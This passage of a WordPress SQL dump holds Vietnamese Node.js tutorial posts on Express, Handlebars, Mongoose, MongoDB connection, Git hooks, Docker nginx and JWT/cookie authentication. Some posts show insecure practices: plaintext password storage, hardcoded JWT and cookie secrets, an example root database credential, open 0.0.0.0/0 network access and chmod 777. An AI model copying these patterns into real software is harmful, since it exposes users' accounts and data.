'open', 'open', '', 'visual-studio-code', '', '', '2022-04-07 06:47:15', '2022-04-07 06:47:15', '', 0, 'https://duycode.com/?p=702', 0, 'post', '', 0),
(708, 1, '2021-01-18 01:15:02', '0000-00-00 00:00:00', '<h2>1. Nodemon</h2>\n- Dùng để tự động chạy lại ứng dụng khi có sự thay đổi về code\n<a href=\"https://www.npmjs.com/package/nodemon\" rel=\"noopener\" target=\"_blank\">https://www.npmjs.com/package/nodemon</a>\n<blockquote>\nnpm i nodemon --save-dev\n</blockquote>\n\n<h3>Sử dụng</h3>\n- Tại file package.json, sửa key: scripts\n<pre>\n  \"scripts\": {\n    \"start\": \"nodemon index.js\",\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n</pre>\n- Mỗi lần khởi chạy, giờ chỉ cần dùng lệnh:\n<blockquote>\nnpm start\n</blockquote>\n\n<h3>Sử dụng Debug</h3>\n<pre>\n  \"scripts\": {\n    \"start\": \"nodemon --inspect index.js\",\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n</pre>\n\n\n<h2>2. Morgan</h2>\n-- Link: <a href=\"https://www.npmjs.com/package/morgan\" rel=\"noopener\" target=\"_blank\">https://www.npmjs.com/package/morgan</a>\n-- Cài đặt:\n<blockquote>\nnpm i morgan --save-dev\n</blockquote>\n<h3>Tác dụng</h3>\n- Mỗi một request đến server, ta thấy console log đã hiện ra thông tin địa chỉ request\n\n\n<h2>3. Sử dụng Express Handlebars</h2>\n-- Link: <a href=\"https://www.npmjs.com/package/express-handlebars\" rel=\"noopener\" target=\"_blank\">https://www.npmjs.com/package/express-handlebars</a>\n-- Cài đặt:\n<blockquote>\nnpm install express-handlebars\n</blockquote>\n\n<h3> Tại file: src/resources/views/layouts/main.hbs</h3>\n<pre>\n<body>\n    {{> header}}\n    <div class=\"container\">\n        {{{body}}}\n    </div>\n    {{> footer}}\n</body>\n</pre>\n-- Khi render bất kỳ một file nào, server sẽ render file main.hbs đầu tiên.\n-- Sau đó file được render sẽ đi vào phần {{{body}}}\n-- {{> header}} và {{> footer}} sẽ được lấy trong partials\n\n<h2>4. Sử dụng SCSS</h2>\n-- Link: <a href=\"https://www.npmjs.com/package/node-sass\" rel=\"noopener\" target=\"_blank\">https://www.npmjs.com/package/node-sass</a>\n-- Cài đặt\n<blockquote>npm install node-sass --save-dev</blockquote>\n-- Sử dụng\n<pre>node-sass [options] <input> [output] </pre>\n-- Tại file package.json\n<pre>\n  \"main\": \"src/index.js\",\n  \"scripts\": {\n    \"start\": \"nodemon --inspect src/index.js\",\n    \"watch\":\"node-sass --watch src/resources/scss/app.scss src/public/css/app.css\",\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n</pre>\n-- chạy terminal\n<blockquote>npm run watch</blockquote>\n\nNote: File index hiện tại như sau:\n<pre>\nconst path = require(\'path\');\nconst express = require(\'express\');\nconst morgan = require(\'morgan\');\nconst handlebars = require(\'express-handlebars\');\n\nconst app = express();\nconst port = 3000;\n\n//Static public link\napp.use(express.static(path.join(__dirname, \'public/\')));\n\n//HTTP logger\napp.use(morgan(\'combined\'));\n\n//Template engine\napp.engine(\'hbs\', handlebars({\n  extname: \'.hbs\'\n}));\napp.set(\'view engine\', \'hbs\');\napp.set(\'views\',path.join(__dirname,\'resources/views\'));\n\napp.get(\'/\', (req, res) => {\n  res.render(\'home\');\n  // res.send(\'<h1>Hello World!</h1>\');\n})\n\napp.get(\'/news\', (req, res) => {\n  res.render(\'news\');\n})\n\napp.listen(port, () => {\n  console.log(`Example app listening at http://localhost:${port}`);\n})\n</pre>\n\n\n\n\n\n', 'NODEJS – 2. CÁC THƯ VIỆN CƠ BẢN', '', 'draft', 'open', 'open', '', '', '', '', '2021-01-18 01:15:02', '0000-00-00 00:00:00', '', 0, 'https://duycode.com/?p=708', 0, 'post', '', 0),
(709, 1, '2021-01-18 01:16:08', '2021-01-17 18:16:08', '<h2>1. Cài đặt thư viện Template engine</h2>\n<h3>1.1. Express Handlebars</h3>\n--  <a href=\"https://www.npmjs.com/package/express-handlebars\" rel=\"noopener\" target=\"_blank\">https://www.npmjs.com/package/express-handlebars</a>\n-- Cài đặt: \n<pre>\nnpm install express-handlebars\n</pre>\n\n<h2>2. Tại main chính: ./src/index.js</h2>\n<pre>\nconst path = require(\'path\');\nconst express = require(\'express\');\n\nconst handlebars = require(\'express-handlebars\');\n\nconst app = express();\nconst port = 3000;\n\n//Static public link\napp.use(express.static(path.join(__dirname, \'public/\')));\n\n//Template engine\napp.engine(\'hbs\', handlebars({\n  extname: \'.hbs\'\n}));\napp.set(\'view engine\', \'hbs\');\napp.set(\'views\',path.join(__dirname,\'resources\',\'views\'));\n\napp.get(\'/\', (req, res) => {\n  res.render(\'home\');\n  // res.send(\'<h1>Hello World!</h1>\');\n})\n\napp.get(\'/news\', (req, res) => {\n  res.render(\'news\');\n})\n</pre>\n\n<h2>3. Cấu trúc thư mục views</h2>\n<pre>\n.\n├── node_modules\n├── src\n│   ├── app\n│   │    ├── controllers\n│   │    └── models\n│   ├── resources\n│   │    └── views\n│   │         ├── layouts\n│   │         │      └── main.hbs\n│   │         ├── partials\n│   │         │      ├── header.hbs\n│   │         │      └── footer.hbs\n│   │         ├── home.hbs\n│   │         └── news.hbs\n│   └── routes\n├── package-lock.json\n└── package.json\n</pre>\n\n<h3>4. Tạo Layout </h3>\n-- Tại file: ./src/resources/views/layouts/main.hbs\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <link rel=\"stylesheet\" href=\"\">\n</head>\n\n<body>\n    {{> header}}\n    {{{body}}}\n    {{> footer}}\n</body>\n\n</html>\n</pre>\n\n-- Tại file: ./src/resources/views/partials/header.hbs\n<pre>\n<h1>Header</h1>\n</pre>\n\n-- Tại file: ./src/resources/views/partials/footer.hbs\n<pre>\n<h1>Footer</h1>\n</pre>\n\n-- Tại file: ./src/resources/views/home.hbs\n<pre>\n<h1>HomePage</h1>\n</pre>\n\n-- Khi render bất kỳ một file nào, server sẽ render file main.hbs đầu tiên.\n-- {{> header}} và {{> footer}} sẽ lấy từ header.hbs và footer.hbs trong partials\n-- Sau đó file được render sẽ đi vào phần {{{body}}}, giả sử home.hbs\n\n\n<h2>5. Render dữ liệu sang views</h2>\n-- Tại nơi render, ví dụ: ./src/index.js\n<pre>\napp.get(\'/\', (req, res) => {\n    res.render(\'home\', {\n        project: \"Demo NodeJS\",\n        author: [\n            { name: \"DuyCode\", job: \"developer\" },\n            { name: \"John\", job: \"designer\" },\n            { name: \"Peter\", job: \"marketing\" },\n        ],\n    });\n})\n</pre>\n\n-- Tại file: ./src/resources/views/home.hbs\n<pre>\n<h1>{{project}}</h1>\n\n{{#each author}}\n<h3>{{this.name}} -- {{this.job}}</h3>\n{{/each}}\n</pre>\n-- Cách render đọc thêm tại: <a href=\"https://handlebarsjs.com/guide/\" rel=\"noopener\" target=\"_blank\">https://handlebarsjs.com/guide/</a>', 'NodeJS – 3. MVC: View & Template engine', '', 'publish', 'open', 'open', '', 'nodejs-3-cac-thu-vien-co-ban', '', '', '2021-01-18 01:16:08', '2021-01-17 18:16:08', '', 0, 'https://duycode.com/?p=709', 0, 'post', '', 0),
(719, 1, '2021-02-25 20:30:16', '2021-02-25 13:30:16', '<h2>1. Models</h2>\n-- Tạo file: ./src/app/models/TuThuoc.js\n-- Cần cài đặt và import thư viện mongoose trước\n<pre>\nconst mongoose = require(\'mongoose\');\nconst Schema = mongoose.Schema;\n\nconst TuThuocSchema = new Schema({\n    TenThuoc: String,\n    ThanhPhan: String,\n    NhomThuoc: String,\n    PhanLoai: {\n        DangThuoc: String,  //Viên,Ống,Gói,Lọ,Chai\n        DuongDung: String,\n        DongHop: Number,\n    },\n    NguonGoc: {\n        NuocSanXuat: String,\n        NhaCungCap: Array,\n    },\n    SoLuong: [{\n        SoHop: Number,\n        SoLe: Number,\n        GiaMua: Number,\n        GiaBan: Number,\n        HanSuDung: Number,\n    }],\n    createdAt: Number,\n    updatedAt: Number,\n    removedAt: Number,\n},\n    {\n        timestamps: false,\n        versionKey: false,\n    }\n);\n\nmodule.exports = mongoose.model(\'TuThuoc\', TuThuocSchema);\n</pre>\n\n<h2>2. Controllers</h2>\n**** Ở Controller có sử dụng rất nhiều Middleware để lấy dữ liệu. Cần lưu ý :sử dụng -body-parser để parser dữ liệu gửi lên từ Client:\n-- Tại file ./src/server.js\n<pre>\napp.use(express.json());\napp.use(express.urlencoded({ extended: true }));\n</pre>\n\n-- Sau khi có model, -body-parser, ta tạo Controllers\n-- Tạo file .src/app/controllers/collections/TuThuocController\n<pre>\nconst Collection = require(\'../../models/TuThuoc\');\n\nclass CollectionController {\n    //--[GET]--       /list                                 -- Get List --\n    list(req, res, next) {\n        Collection.find({ removedAt: 0 })\n            .then(results => {\n                res.json({ data: results })\n            })\n            .catch(err => next())\n    }\n\n    //--[GET]--       /trash-list                          -- Get List Trash --\n    trashList(req, res, next) {\n        Collection.find({ removedAt: { $ne: 0 } })\n            .then(results => res.json({ data: results }))\n            .catch(err => next())\n    }\n\n    //--[GET]--       /:id                                 -- Get One  By ID--\n    findOne(req, res, next) {\n        Collection.findById(req.params.id)\n            .then((results) => res.json(results))\n            .catch(next);\n    }\n    //--[POST]--      /add                                 -- Add  --\n    store(req, res, next) {\n        Object.assign(req.body, {\n            createdAt: Date.now(),\n            updatedAt: Date.now(),\n            removedAt: 0,\n        })\n        const newData = new Collection(req.body);\n        newData.save()\n            .then((results) => res.json(results))\n            .catch(next);\n    }\n    //--[PUT]--       /:id                                -- Update By ID --\n    update(req, res, next) {\n        Object.assign(req.body, {\n            updatedAt: Date.now(),\n        })\n        Collection.findByIdAndUpdate(req.params.id, req.body, { new: true })\n            .then((results) => res.json(results))\n            .catch(next);\n    }\n    // --[PATCH]--    /remove/:id                         -- Remove By ID --\n    remove(req, res, next) {\n        Collection.findByIdAndUpdate(req.params.id, { removedAt: Date.now() }, { new: true })\n            .then((results) => res.json(results))\n            .catch(next)\n    }\n    //--[PATCH]--     /restore/:id                        -- Restore By ID --\n    restore(req, res, next) {\n        Collection.findByIdAndUpdate(req.params.id, { removedAt: 0 }, { new: true })\n            .then((results) => res.json(results))\n            .catch(next)\n    }\n    //--[DELETE]--    /destroy/:id                        -- Destroy By ID --\n    destroy(req, res, next) {\n        Collection.deleteOne({ _id: req.params.id })\n            .then((results) => res.json(results))\n            .catch(next);\n    }\n    // --[PATCH]--    /remove/:id                         -- Remove By ID --\n    removeList(req, res, next) {\n        Collection.updateMany({ _id: { $in: req.body.ids } }, { removedAt: Date.now() })\n            .then((results) => res.json(results))\n            .catch(next)\n    }\n    // --[PATCH]--    /restore/:id                        -- Restore List By ID --\n    restoreList(req, res, next) {\n        Collection.updateMany({ _id: { $in: req.body.ids } }, { removedAt: 0 })\n            .then((results) => res.json(results))\n            .catch(next)\n    }\n    // --[PATCH]--    /destroy/:id                         -- Destroy List By ID --\n    destroyList(req, res, next) {\n        Collection.deleteMany({ _id: { $in: req.body.ids } })\n            .then((results) => res.json(results))\n            .catch(next)\n    }\n}\n\nmodule.exports = new CollectionController();\n</pre>\n\n\n', 'NodeJS – 5. MVC: Models & Controllers', '', 'publish', 'open', 'open', '', 'nodejs-5-mvc-models-controllers', '', '', '2021-02-25 20:30:16', '2021-02-25 13:30:16', '', 0, 'https://duycode.com/?p=719', 0, 'post', '', 0),
(725, 1, '2021-01-18 22:41:55', '2021-01-18 15:41:55', '<h2>1. Cài đặt thư viện Mongoose</h2>\nGithub: <a href=\"https://github.com/Automattic/mongoose\" rel=\"noopener\" target=\"_blank\">https://github.com/Automattic/mongoose</a>\n<pre>\nnpm install mongoose\n</pre>\n\n<h2>2. Tạo Connect MongoDB</h2>\n<h3>1.1. Tại main chính: ./src/index.js</h3>\n<pre>\nconst db = require(\'./config/db\');\n\n//Connect to DB\ndb.connect();\n</pre>\n\n<h3>1.2. Tạo file connect: ./src/config/db/index.js</h3>\n<pre>\nconst mongoose = require(\'mongoose\');\n\nasync function connect() {\n    try {\n        await mongoose.connect(\'mongodb://localhost:27017/f8_education_dev\', {\n            useNewUrlParser: true,\n            useUnifiedTopology: true,\n            useCreateIndex: true,\n        });\n        console.log(\'Connect successfully !!!\');\n    } catch (error) {\n        console.log(\'Connect failure !!!\');\n    }\n}\n\nmodule.exports = { connect };\n\n</pre>\n-- Nếu connect không thành công, sau 30 giây, sẽ bắn ra lỗi error\n\n<h2>3. Tạo Model</h2>\n-- Thêm thư viện slug (đường dẫn) của mongoose\n<pre>\nnpm install mongoose-slug-generator --save\n</pre>\n\n-- Tạo file: ./src/app/models/Courses.js\n<pre>\nconst mongoose = require(\'mongoose\');\n\nconst slug = require(\'mongoose-slug-generator\');\nconst mongooseDelete = require(\'mongoose-delete\');\n\nconst Schema = mongoose.Schema;\n\nconst CourseSchema = new Schema(\n    {\n        name: {type: String,require: true,default: \'\',minlength: 1,maxlength: 255,},\n        description: { type: String },\n        image: { type: String },\n        videoID: { type: String, require: true },\n        level: { type: String },\n        slug: { type: String, slug: \'name\', unique: true },\n    },\n    {\n        timestamps: true,\n    },\n);\n\n//Add plugins\nmongoose.plugin(slug);\nCourseSchema.plugin(mongooseDelete, {\n    deletedAt: true,\n    overrideMethods: \'all\',\n});\n\n// module.exports = mongoose.model(\'ModelName\', mySchema)\nmodule.exports = mongoose.model(\'Course\', CourseSchema);\n\n</pre>\n-- ModelName: viết ở dạng số nhiều -> mongoose sẽ tự đổi thành chữ viết thường + số nhiều để tương ứng với tên collection trong database\n\n\n<h2>4. Sử dụng Controller kết nối Model, và render ra View</h2>\n-- Xem phần CRUD', 'NodeJS - 5. MVC: Model & MongoDB', '', 'publish', 'open', 'open', '', 'nodejs-5-mvc-model-mongodb', '', '', '2021-01-18 22:41:55', '2021-01-18 15:41:55', '', 0, 'https://duycode.com/?p=725', 0, 'post', '', 0),
(735, 1, '2021-01-19 12:36:25', '2021-01-19 05:36:25', '<h2>1. Các thư viện cần thiết</h2>\n<h3>1.1. Prettier: </h3>\n- Prettier mục đích để format code theo quy chuẩn\nGithub: <a href=\"https://github.com/prettier/prettier\" rel=\"noopener\" target=\"_blank\">https://github.com/prettier/prettier</a>\nDocument: <a href=\"https://prettier.io/docs/en/\" rel=\"noopener\" target=\"_blank\">https://prettier.io/docs/en/</a>\nConfig: <a href=\"https://prettier.io/docs/en/configuration.html\" rel=\"noopener\" target=\"_blank\">https://prettier.io/docs/en/configuration.html</a>\n<h3>1.2. Lint-staged</h3>\n- Lint-staged mục đích để chạy 1 lệnh CMD khi sử dụng lệnh git (git add, git commit ....)\n- Github: <a href=\"https://github.com/okonet/lint-staged\" rel=\"noopener\" target=\"_blank\">https://github.com/okonet/lint-staged</a>\n<h3>1.3. Husky</h3>\n- Github: <a href=\"https://github.com/typicode/husky/tree/master\" rel=\"noopener\" target=\"_blank\">https://github.com/typicode/husky/tree/master</a>\n\n<h3>1.4. Cài đặt thư viện</h3>\n<pre>\nnpm i prettier lint-staged husky --save-dev\n</pre>\n\n<h2>2. Sử dụng Prettier: </h2>\n-- Tại ./package.json -> Tạo scripts để chạy CLI\n<pre>\n\"scripts\": {\n    \"beautiful\": \"prettier --single-quote --trailing-comma all --tab-width 4 --write src/**/*.{json,js,scss}\",\n    \"start\": \"nodemon --inspect src/index.js\",\n},\n</pre>\n-- Lưu ý, đường dẫn thư mục không cần có dấu nháy đơn \n-- Sử dụng CLI (Terminal)\n<pre>\nnpm run beautiful\n</pre>\n\n<h2>3. Sử dụng Lint-staged: </h2>\n<h3>3.1. Cài đặt</h3>\n-- Tại ./package.json -> Tạo lint-staged (cấp 1, đứng ngang hàng với script)\n<pre>\n{\n  \"lint-staged\": {\n    \"*\": \"your-cmd\"\n  }\n}\n</pre>\n-- Ví dụ\n<pre>\n\"scripts\": {\n    \"beautiful\": \"lint-staged\",\n    \"start\": \"nodemon --inspect src/index.js\",\n},\n\n\"lint-staged\": {\n    \"src/**/*.{json,js,scss}\": \"prettier --single-quote --trailing-comma all --tab-width 4 --write\"\n},\n</pre>\n<h3>3.2. Sử dụng</h3>\n-- Như vậy, khi ta chạy dòng lệnh CLI \"npm run beautiful\" thì lệnh \"lint-staged\" sẽ được kích hoạt.\n-- \"lint-staged\" sẽ tìm tất cả file đang ở trạng thái \"git staged files\". Trong đó, những file nào match được với pattern \"src/**/*.{json,js,scss}\" thì sẽ chạy dòng lệnh prettier\n-- File ở trạng thái \"git staged files\": nghĩa là file đang được git add, commit,....\n-- Ví dụ: chạy lần lượt các dòng lệnh CLI để beautiful tất cả các file được add lên git\n<pre>\ngit add .\nnpm run beautiful\n</pre>\n\n<h2>4. Sử dụng Husky: </h2>\n-- Tại ./package.json -> Tạo husky (cấp 1, đứng ngang hàng với script)\n<pre>\n{\n  \"husky\": {\n    \"hooks\": {\n      \"pre-commit\": \"lint-staged\",\n      \"pre-push\": \"npm test\",\n      \"...\": \"...\"\n    }\n  }\n}\n</pre>\n-- Khi commit code lên git, \"pre-commit\" sẽ chạy trước ứng với lệnh \"lint-staged\".\n-- Như vậy, khi git commit, code sẽ tự động được format, sau đó được đẩy lên git -> rất nhàn và hiệu quả :D', 'NodeJS - Làm việc nhóm với Git - Format Code', '', 'publish', 'open', 'open', '', 'nodejs-lam-viec-nhom-voi-git-format-code', '', '', '2021-01-19 12:36:25', '2021-01-19 05:36:25', '', 0, 'https://duycode.com/?p=735', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(745, 1, '2021-05-05 00:00:29', '2021-05-04 17:00:29', '<h1>I. Cấu hình MongoDB</h1>\n<h2>1. Dùng trên Localhost: MongoDB Compass</h2>\n- Download: <a href=\"https://www.mongodb.com/try\" rel=\"noopener\" target=\"_blank\">https://www.mongodb.com/try</a>\n- Vào Onpremises -> MingoDB Community Server -> Download -> Install bình thường\n- Để link truy cập Localhost tại file .env\n<blockquote>\nMONGO_LOCALHOST=mongodb://localhost:27017/medihome\n</blockquote>\n\n<h2>2. Tạo Project trên MongoDB</h2>\n1.1. Tạo Cluster\n- Đăng nhập -> Tạo Project (2 bước: Tên Project và add Member)\n- Build Cluster\n1.2. Connect Cluster \n- Cài Network Access: IP được phép truy cập trước (nên chọn 0.0.0.0/0 -> có thể truy cập mọi nơi để tránh phát sinh lỗi)\n- Cài tài khoản có quyền truy cập\n1.3. Cấu hình\n- Để link truy cập MongoDBtại file .env\n<blockquote>\nMONGODB_URI=mongodb+srv://root:abcD1234@cluster0-wuil3.mongodb.net/test?retryWrites=true\n</blockquote>\n\n<h1>II. Kết nối MongoDB</h1>\n<h2>1. Cấu hình file ./.env</h2>\n<pre>\nMONGODB_URI=mongodb+srv://user:password@cluster0.bgpn9.mongodb.net/dbname?retryWrites=true&w=majority\nMONGO_LOCALHOST=mongodb://localhost:27017/medihome\nMONGODB_DB_NAME=medihome\n</pre>\n<h2>2. Dùng mongodb</h2>\n1.1. Cài đặt thư viện:\n<a href=\"https://www.npmjs.com/package/mongodb\" rel=\"noopener\" target=\"_blank\">https://www.npmjs.com/package/mongodb</a>\n<blockquote>npm i mongodb</blockquote>\n\n1.2. Tạo file: src/config/database/mongoDB.js\n<pre>\nconst MongoClient = require(\'mongodb\').MongoClient;\nlet _mongodb;\nlet options = { useNewUrlParser: true, useUnifiedTopology: true };\n\nlet connect = async (uri, dbname) => {\n	try {\n		let client = new MongoClient(uri, options);\n		let _connection = await client.connect();\n		_mongodb = _connection.db(dbname);\n        console.log(\'\\x1b[33m\' + \'MongoDB connect successfully !!!\' + \'\\x1b[0m\');\n	} catch (error) {\n		console.log(\'\\x1b[33m\\x1b[41m\' + error + \'\\x1b[0m\');\n	}\n};\n\nlet getDB = () => {\n	return _mongodb;\n};\n\nmodule.exports = { getDB, connect };\n</pre>\n\n1.3. Tại file: src/server.js\n<pre>\nconst uri = process.env.MONGODB_URI || process.env.MONGO_LOCALHOST;\nconst mongoDB = require(\'./config/database/mongoDB\');\nmongoDB.connect(uri, process.env.MONGODB_DB_NAME);\n</pre>\n\n1.4. Sử dụng\n<pre>\nconst mongoDB = require(\'../../../config/database/mongoDB\');\nconst ObjectId = require(\'mongodb\').ObjectId;\n\nlet collection = mongoDB.getDB().collection(\'phieunhapthuocs\');\ncollection.insertOne(req.body, (error, results) => {\n	if (error) throw error;\n	console.log(\'Insert One, Have Done !!!\');\n});\n</pre>\n\n<h2>3. Dùng mongoose</h2>\n2.1. Cài đặt thư viện:\n-- Github: <a href=\"https://github.com/Automattic/mongoose\" rel=\"noopener\" target=\"_blank\">https://github.com/Automattic/mongoose</a>\n<blockquote>npm install mongoose</blockquote>\n\n3.2. Tạo file: src/config/database/mongo.js\n<pre>\nconst mongoose = require(\'mongoose\');\n\nconnect = (uri) => {\n    let options = {\n        useNewUrlParser: true,\n        useUnifiedTopology: true,\n        useCreateIndex: true,\n        useFindAndModify: false,\n    }\n    mongoose.connect(uri, options)\n        .then(() => console.log(\'Connect successfully !!!\'))\n        .catch((error) => console.log(\'Connect failure !!!\'))\n}\n\nmodule.exports = { connect };\n</pre>\n\n3.3. Tại file: src/server.js\n<pre>\nconst uri = process.env.MONGODB_URI || process.env.MONGO_LOCALHOST;\nconst mongo = require(\'./config/database/mongo\');\nmongo.connect(uri);\n</pre>\n\n3.4. Sử dụng\n<pre>\nconst mongoDB = require(\'../../../config/database/mongoDB\');\n\nmongoDB.getDB().collection(\'users\').find({}, function (error, result) {\n	if (error) throw error;\n	result.toArray(function (err, list) {\n		console.log(list[0]);\n	});\n});\n</pre>', 'NodeJS – 5. Connect MongoDB', '', 'publish', 'open', 'open', '', 'nodejs-4-2-deploy-heroku-va-connect-mongodb', '', '', '2021-05-05 00:00:29', '2021-05-04 17:00:29', '', 0, 'https://duycode.com/?p=745', 0, 'post', '', 0),
(762, 1, '2022-06-15 09:00:53', '2022-06-15 09:00:53', '<h2>1. Khởi chạy </h2>\r\n1.1. Chuẩn bị Image\r\n<pre>\r\n// Bản alpine không có \"bash\" để sử dụng\r\ndocker pull nginx:1.22-alpine\r\ndocker pull nginx:1.22\r\n\r\ndocker run -d -p 8081:80 --name test-nginx nginx:1.22-alpine\r\n// Truy cập: localhost://8081 sẽ thấy nginx hoạt động\r\n</pre>\r\n\r\n1.2. Lấy file Config :D\r\n<pre>\r\n// Lấy file config trên Ubuntu hoặc Windows\r\ndocker run --rm -v /home/duy.ngo/Project/medihome-vn/mh-nginx/:/home/ nginx:1.22 cp /etc/nginx/conf.d/default.conf /home/\r\ndocker run --rm -v D:\\Project\\medihome-vn\\mh-nginx\\:/home/ nginx:1.22 cp /etc/nginx/conf.d/default.conf /home/ \r\n\r\n// Phân quyền để được sửa file nginx\r\ncd /home/duy.ngo/Project/medihome-vn/\r\nls -la\r\nsudo chmod -R 777 mh-nginx\r\n\r\n// Tạo docker với config để bên ngoài\r\ndocker run -d -p 8080:80 -v /home/duy.ngo/Project/medihome-vn/mh-nginx/default.conf:/etc/nginx/conf.d/default.conf --name my-nginx nginx:1.22\r\n</pre>\r\n\r\n1.3. Config thêm đường dẫn ./about\r\nSửa file medihome-vn/mh-nginx/default.conf như sau\r\n<pre>\r\nserver {\r\n    listen       80;\r\n    server_name  localhost;\r\n\r\n    location / {\r\n        root   /usr/share/nginx/html;\r\n        index  index.html index.htm;\r\n    }\r\n\r\n    location /about {\r\n        add_header Content-Type text/html;\r\n        return 200 \'<h2>This is About Page</body></h2>\';\r\n    }\r\n\r\n    error_page   500 502 503 504  /50x.html;\r\n    location = /50x.html {\r\n        root   /usr/share/nginx/html;\r\n    }\r\n}\r\n</pre>\r\n\r\n- Kiểm tra sửa thành công chưa, (-t check cú pháp)\r\n<pre>\r\ndocker exec my-nginx cat /etc/nginx/conf.d/default.conf\r\ndocker exec my-nginx nginx -t\r\ndocker exec my-nginx nginx -s reload\r\n</pre>\r\n\r\n- Test thử vào: http://localhost:8080 và http://localhost:8080/about\r\n', 'Docker - 9.1. Nginx cơ bản', '', 'publish', 'open', 'open', '', 'docker-9-nginx', '', '', '2022-08-11 09:27:22', '2022-08-11 09:27:22', '', 0, 'https://duycode.com/?p=762', 0, 'post', '', 0),
(794, 1, '2021-05-09 06:00:32', '2021-05-08 23:00:32', '<h2>1. Routes</h2>\n-- Để kiểm tra đăng nhập với mọi Request, cho middleware lên đầu.\n-- Thêm middleware vào mỗi router, giả sử muốn vào trang ad bắt buộc đăng nhập\n-- Tại file: ./src/routes/router.js\n<pre>\nconst express = require(\'express\');\nconst router = express.Router();\n\nconst accountRouter = require(\'./accountRouter\');\nconst adminRouter = require(\'./adminRouter\');\n\nconst authen = require(\'../app/middlewares/authentication\');\n\nrouter.use(authen.getUser);\n\nrouter.use(\'/account\', accountRouter);\nrouter.use(\'/admin\', authen.requireLogin, adminRouter);\n\nrouter.use(\'/\', (req, res) => {\n	res.render(\'home/index\');\n});\n\nmodule.exports = router;\n</pre>\n\n<h2>2. Middleware</h2>\n-- Tạo file: ./src/app/middlewares/authentication.js \n<pre>\nconst jwt = require(\'jsonwebtoken\');\nconst mongoDB = require(\'../../config/database/mongoDB\');\nconst ObjectId = require(\'mongodb\').ObjectId;\n\nmodule.exports = {\n	getUser: async function (req, res, next) {\n		if (!req.signedCookies.accountID) {\n			res.locals.account = {};\n			return next();\n		}\n		try {\n			let token = req.signedCookies.accountID,\n				decode = jwt.verify(token, process.env.SECRET_JWT),\n				accountID = decode._id;\n\n			let collection = mongoDB.getDB().collection(\'accounts\'),\n				account = await collection.findOne({ _id: new ObjectId(accountID) });\n\n			if (!account) {\n				res.clearCookie(\'accountID\');\n				res.locals.account = {};\n			} else {\n				res.locals.account = account;\n			}\n			return next();\n		} catch (err) {\n			res.clearCookie(\'accountID\');\n			res.locals.account = {};\n			return next();\n		}\n	},\n	requireLogin: function(req, res, next) {\n        if (!res.locals.account.Gmail) {\n            return res.redirect(\'/account/login\');\n        }\n        return next();\n    },\n};\n\n</pre>\n\n<h2>3. Tại view EJS</h2>\n-- Dùng if else để check đăng nhập chưa rất dễ dàng\n<pre>\n<div id=\"info-user\">\n	<% if (locals.account.Gmail) { %> \n		<%= locals.account.Gmail %> \n		<a href=\"/account/logout\">Logout</a>\n	<% } else { %>\n		<a href=\"/account/login\">Đăng nhập</a>\n	<% } %>\n</div>\n</pre>\n\n<h2>4. Tại Controller</h2>\n-- Thêm điều kiện của res.locals vào mỗi Query sẽ được kết quả mong muốn :v\n<pre>\nfindListExist = (req, res, next) => {\n	let conditions = {\n		ManagerID: res.locals.account.ManagerID,\n		removedAt: 0,\n	};\n	Collection.find(conditions)\n		.then((results) => res.json({ data: results }))\n		.catch((err) => next());\n};\n</pre>', 'NodeJS – 9.3. Authentication: Middleware', '', 'publish', 'open', 'open', '', 'nodejs-9-3-authentication-middleware', '', '', '2021-05-09 06:00:32', '2021-05-08 23:00:32', '', 0, 'https://duycode.com/?p=794', 0, 'post', '', 0),
(808, 1, '2021-05-09 03:00:01', '2021-05-08 20:00:01', '<h2>1. jsonwebtoken </h1>\n-- Cài đặt: <blockquote>npm install jsonwebtoken</blockquote>\n<pre>\nconst jwt = require(\'jsonwebtoken\');\n\nlet data = {_id : \'duycode\'};\n\n//encode object data --> tạo ra chuỗi token:\nlet token = jwt.sign(data,\'kjKJK#XC&*ZCDS#\', {\n    expiresIn: 60 * 60\n});\n\nconsole.log(token)\n//eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiJkdXljb2RlIiwiaWF0IjoxNjExNzI5NjE3fQ.GSiTLZIqgUDyj-JdGZjo1lR72WBdajbNj96BxZAA3ms\n\n//decode chuỗi token --> tạo ra object data\nlet decode = jwt.verify(token,\'kjKJK#XC&*ZCDS#\');\n\nconsole.log(decode)\n//{ _id: \'duycode\', iat: 1611730075, exp: 1611730105 }\n</pre>\n\n<h2>2. cookie-parser </h2>\n-- Cài đặt: <blockquote>npm install cookie-parser</blockquote>\n2.1. Tại ./src/server.js\n<pre>\nconst cookieParser = require(\'cookie-parser\');\napp.use(cookieParser(@$123%@#XYZ));\n</pre>\n2.2. Sử dụng\n<pre>\n// Set cookie cho response, -> key: \'userID\'; value: token\nres.cookie(\'userID\', token, {\n    signed: true,\n});\n\n// Get cookie\nlet token = req.signedCookies.userID;\n\n// Delete cookie\nres.clearCookie(\'userID\');\n</pre>\n\n<h2>3. Khai báo thêm biến của .env hoặc trên Heroku </h2>\n<blockquote>\nSECRET_JWT=kjKJK#XC&*ZCDS#\nSECRET_SIGNEDCOOKIES=@$123%@#XYZ\n</blockquote>\n\n<h2>4. AccountController</h2>\n-- Tại file: ./src/app/controllers/AccountController.js\n-- Tạo chuỗi token với object là: {_id: account._id};\n-- Lưu chuỗi token vào cookie\n<pre>\nconst mongoDB = require(\'../../config/database/mongoDB\');\nconst jwt = require(\'jsonwebtoken\');\n\nclass AccountController {\n	register = async (req, res, next) => {\n		try {\n			let newAccount = {\n				Gmail: req.body.Gmail,\n				Phone: req.body.Phone,\n				Password: req.body.Password,\n				Role: \'Manager\',\n\n				createdAt: Date.now(),\n				updatedAt: Date.now(),\n				removedAt: 0,\n			};\n			let response = await mongoDB.getDB().collection(\'accounts\').insertOne(newAccount);\n			console.log(\'Tạo tài khoản mới thành công: \', response.ops);\n\n			//Tạo token và lưu token vào 